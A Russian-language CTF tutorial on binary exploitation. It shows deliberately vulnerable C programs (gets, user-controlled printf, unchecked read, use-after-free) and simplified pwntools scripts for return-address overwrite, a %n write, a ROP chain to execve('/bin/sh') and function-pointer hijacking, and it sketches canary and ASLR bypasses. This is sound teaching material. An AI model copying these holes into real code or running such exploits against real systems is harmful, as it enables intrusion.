### Введение в PWN  

PWN (произносится как "овн" и происходит от слова "own" — владеть) в контексте CTF — это процесс взлома программного обеспечения, чаще всего бинарных файлов, через эксплуатацию уязвимостей. Цель — выполнить несанкционированные действия, например, запустить произвольный код или получить доступ к флагу. Основные типы уязвимостей в PWN-задачах:  

- **Переполнение буфера (Buffer Overflow)**: Программа записывает данные за пределы выделенного буфера, что позволяет перезаписать важные данные, такие как адрес возврата функции.  
- **Уязвимости форматных строк (Format String Vulnerabilities)**: Неправильное использование функций вроде `printf` позволяет читать или изменять память.  
- **Проблемы с указателями**: Например, использование указателя после освобождения памяти (use-after-free).  

Для работы с PWN-задачами вам потребуются:  
- Знание языков C/C++.  
- Основы ассемблера (x86/x64).  
- Понимание работы стека, кучи и регистров в операционных системах.  
- Умение использовать инструменты анализа и отладки.  

---

### Инструменты для PWN  

Вот основные инструменты, которые мы будем использовать:  

- **GDB (GNU Debugger)**: Отладчик для пошагового выполнения программ, просмотра памяти и регистров.  
- **Pwntools**: Python-библиотека для автоматизации создания эксплойтов и взаимодействия с бинарниками.  
- **IDA Pro / Ghidra**: Инструменты для дизассемблирования и анализа кода бинарных файлов.  
- **Objdump**: Утилита для просмотра дизассемблированного кода и структуры бинарников.  

---

### Пример 1: Переполнение буфера  

Начнем с классической уязвимости — переполнения буфера. Рассмотрим простую программу на C:  

```c
#include <stdio.h>
#include <string.h>

void vulnerable_function() {
    char buffer[10];
    printf("Enter your name: ");
    gets(buffer);  // Опасная функция, не проверяет длину ввода
    printf("Hello, %s!\n", buffer);
}

int main() {
    vulnerable_function();
    return 0;
}
```

#### Что здесь не так?  
Функция `gets` не проверяет, помещается ли введенная строка в буфер размером 10 байт. Если ввести больше 10 символов, произойдет переполнение буфера, что может перезаписать адрес возврата функции и дать атакующему контроль над программой.  

#### Шаги эксплуатации:  
1. **Анализ бинарника**: Используем GDB или Ghidra, чтобы найти адрес "секретной" функции (например, функции, которая выводит флаг). Допустим, ее адрес — `0x080484b6`.  
2. **Определение смещения**: Нужно выяснить, сколько байт нужно ввести, чтобы добраться до адреса возврата. Для этого можно использовать паттерн (например, "AAAABBBBCCCC...") и посмотреть, какие символы перезаписывают адрес возврата. Предположим, смещение — 14 байт.  
3. **Создание payload**: Формируем ввод: 14 байт мусора + адрес секретной функции в little-endian формате (`\xb6\x84\x04\x08`).  
4. **Запуск эксплойта**: Вводим payload, и программа вызывает секретную функцию вместо возврата в `main`.  

#### Пример payload (Python с pwntools):  
```python
from pwn import *

p = process('./vulnerable')
payload = b"A" * 14 + p32(0x080484b6)  # 14 байт мусора + адрес функции
p.sendline(payload)
p.interactive()
```

Если все сделано правильно, программа выполнит секретную функцию.  

---

### Пример 2: Уязвимость форматной строки  

Теперь рассмотрим уязвимость форматной строки. Вот пример программы:  

```c
#include <stdio.h>

int main() {
    char input[100];
    printf("Enter something: ");
    fgets(input, 100, stdin);
    printf(input);  // Опасно: пользователь контролирует форматную строку
    return 0;
}
```

#### Что здесь не так?  
Функция `printf` использует пользовательский ввод как форматную строку. Если ввести специальные символы вроде `%x` или `%n`, можно читать или записывать данные в памяти.  

#### Шаги эксплуатации:  
1. **Чтение стека**: Вводим `%x %x %x`, чтобы увидеть значения на стеке. Это помогает найти адреса или данные.  
2. **Запись в память**: Используем `%n`, который записывает количество выведенных символов по указанному адресу. Например, можно изменить переменную `is_admin` с 0 на 1.  
3. **Поиск цели**: Допустим, адрес переменной `is_admin` — `0x0804a01c`, и она находится на стеке в четвертой позиции.  
4. **Создание payload**: Формируем строку, чтобы записать значение в нужный адрес.  

#### Пример payload (Python с pwntools):  
```python
from pwn import *

p = process('./format_vuln')
payload = p32(0x0804a01c) + b"%4$n"  # Адрес переменной + запись в 4-й аргумент
p.sendline(payload)
p.interactive()
```

Этот payload перезапишет значение по адресу `0x0804a01c`, что может дать доступ к флагу.  

---

### Введение в продвинутые техники PWN

В современных операционных системах используются различные механизмы защиты, такие как DEP (Data Execution Prevention), ASLR (Address Space Layout Randomization) и Canary, которые усложняют эксплуатацию уязвимостей. Для обхода этих защит разработаны продвинутые техники эксплуатации:

- **ROP (Return-Oriented Programming)**: Техника, позволяющая выполнять произвольный код, используя фрагменты кода (гаджеты) из существующего бинарника, что помогает обойти DEP.
- **Эксплуатация уязвимостей кучи**: Включает такие атаки, как use-after-free, double-free и переполнение буфера в куче, что позволяет манипулировать структурами данных в памяти.

Для успешной эксплуатации вам потребуется:

- Глубокое понимание работы стека и кучи.
- Умение находить и использовать гаджеты для ROP.
- Знание механизмов защиты и способов их обхода.
- Опыт работы с инструментами анализа и отладки.

---

### Пример 3: ROP для обхода DEP

Рассмотрим программу с переполнением буфера, но с включенным DEP, что запрещает выполнение кода из стека.

```c
#include <stdio.h>
#include <string.h>

void vulnerable_function() {
    char buffer[100];
    read(0, buffer, 200);  // Переполнение буфера
}

int main() {
    vulnerable_function();
    return 0;
}
```

#### Что здесь не так?

Функция `read` позволяет записать 200 байт в буфер размером 100 байт, что вызывает переполнение. Однако из-за DEP мы не можем просто записать shellcode в стек и передать на него управление.

#### Шаги эксплуатации с ROP:

1. **Анализ бинарника**: Используем Ghidra или IDA Pro, чтобы найти полезные гаджеты — короткие последовательности инструкций, заканчивающиеся на `ret`.
2. **Построение ROP-цепочки**: Находим гаджеты для выполнения системных вызовов, например, для вызова `execve("/bin/sh", 0, 0)`.
3. **Определение смещения**: Находим смещение до адреса возврата, как в примере с переполнением буфера.
4. **Создание payload**: Формируем цепочку гаджетов, чтобы выполнить нужные инструкции.

#### Пример ROP-цепочки (упрощенный):

- Гаджет 1: `pop eax; ret` — загружает значение в EAX.
- Гаджет 2: `pop ebx; ret` — загружает значение в EBX.
- Гаджет 3: `int 0x80` — выполняет системный вызов.

Payload будет состоять из адресов этих гаджетов и данных, которые они загружают.

#### Пример payload (Python с pwntools):

```python
from pwn import *

p = process('./rop_example')
offset = 112  # Смещение до адреса возврата
rop_chain = [
    0x080485b6,  # Адрес гаджета: pop eax; ret
    0xb,         # Значение для EAX (номер системного вызова execve)
    0x0804867c,  # Адрес гаджета: pop ebx; ret
    0x0804a01c,  # Адрес строки "/bin/sh"
    0x080487a3,  # Адрес гаджета: int 0x80
]
payload = b"A" * offset + b"".join([p32(addr) for addr in rop_chain])
p.sendline(payload)
p.interactive()
```

Этот payload выполнит системный вызов `execve("/bin/sh", 0, 0)`, открывая shell.

---

### Пример 4: Эксплуатация уязвимости кучи (use-after-free)

Теперь рассмотрим уязвимость use-after-free в программе, работающей с кучей.

```c
#include <stdio.h>
#include <stdlib.h>

typedef struct {
    void (*func)();
    char data[100];
} Object;

void secret_function() {
    system("/bin/sh");
}

int main() {
    Object* obj1 = malloc(sizeof(Object));
    obj1->func = secret_function;
    
    Object* obj2 = malloc(sizeof(Object));
    obj2->func = puts;
    
    free(obj1);  // Освобождаем obj1
    
    // Use-after-free: используем obj1 после освобождения
    obj1->func();  // Вызываем функцию, указатель на которую может быть перезаписан
}
```

#### Что здесь не так?

Программа вызывает `obj1->func()` после освобождения `obj1`, что является use-after-free уязвимостью. Если память, на которую указывает `obj1`, будет переиспользована, мы можем контролировать указатель `func`.

#### Шаги эксплуатации:

1. **Анализ поведения**: После `free(obj1)`, память может быть переиспользована для другого объекта.
2. **Контроль указателя**: Если мы можем записать данные в освобожденную память, то можем перезаписать `func` на адрес другой функции, например, `secret_function`.
3. **Создание payload**: В CTF-задаче часто есть возможность ввести данные, которые будут записаны в память, переиспользуемую после `free`.

#### Пример payload:

Предположим, что после `free(obj1)` программа читает данные в новый объект, который занимает ту же память. Мы можем ввести адрес `secret_function` в поле `func`.

```python
from pwn import *

p = process('./uaf_example')
# Допустим, программа читает 4 байта для obj2->func
payload = p32(0x080484b6)  # Адрес secret_function
p.sendline(payload)
p.interactive()
```

Таким образом, при вызове `obj1->func()` будет выполнена `secret_function`, открывающая shell.

---

### Обход защитных механизмов

В реальных задачах часто используются защитные механизмы, которые нужно обходить:

- **Canary**: Защита от переполнения буфера. Обходится утечкой значения canary или его перезаписью.
- **ASLR**: Рандомизация адресного пространства. Обходится утечкой адресов или использованием относительных смещений.
- **PIE (Position Independent Executable)**: Бинарник загружается на случайный адрес. Обходится аналогично ASLR.

#### Пример обхода canary:

1. **Утечка canary**: Если в программе есть уязвимость форматной строки или возможность чтения памяти, можно узнать значение canary.
2. **Включение canary в payload**: При переполнении буфера включаем правильное значение canary в payload, чтобы программа не обнаружила переполнение.